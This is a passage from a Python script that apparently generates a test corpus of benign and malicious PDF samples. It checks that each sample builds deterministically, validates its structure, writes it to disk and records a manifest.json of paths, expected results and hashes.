        if data[offset:offset + len(header)] != header:
            raise AssertionError(f"object {num}: xref offset {offset} does not point at its header")


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--large", action="store_true", help="also generate the on-demand files")
    args = parser.parse_args()

    manifest = {
        "version": 1,
        "generator": "tests/corpus/generate.py",
        "note": "Generated file; run `python tests/corpus/generate.py`. Descriptions in README.md.",
        "files": [],
    }
    for sample in SAMPLES:
        data = sample.build()
        if data != sample.build():
            raise AssertionError(f"{sample.path} is not deterministic")
        if sample.path.startswith("benign/") or sample.path.startswith("malicious/"):
            check_structure(data)
        target = ROOT / sample.path
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_bytes(data)
        manifest["files"].append({
            "path": sample.path,
            "category": sample.path.split("/")[0],
            "purpose": sample.purpose,
            "expected": sample.expected,
            "pages": sample.pages,
            "findings": sample.findings,
            "text": sample.text,
            "bytes": len(data),
            "sha256": hashlib.sha256(data).hexdigest(),
        })
    for path, _, purpose, expected, pages in ON_DEMAND:
        manifest["files"].append({
            "path": path,
            "category": "large",
            "purpose": purpose,
            "expected": expected,
            "pages": pages,
            "findings": [],
            "text": [],
            "onDemand": True,
        })

    with open(ROOT / "manifest.json", "w", encoding="utf-8", newline="\n") as handle:
        json.dump(manifest, handle, ensure_ascii=False, indent=2)
        handle.write("\n")

    if args.large:
        LARGE_OUTPUT.mkdir(parents=True, exist_ok=True)
        for path, build, *_ in ON_DEMAND:
            print(f"generating {path} ...", file=sys.stderr)
            build(ROOT / path)

    print(f"wrote {len(SAMPLES)} samples and manifest.json", file=sys.stderr)
    return 0


if __name__ == "__main__":
    sys.exit(main())
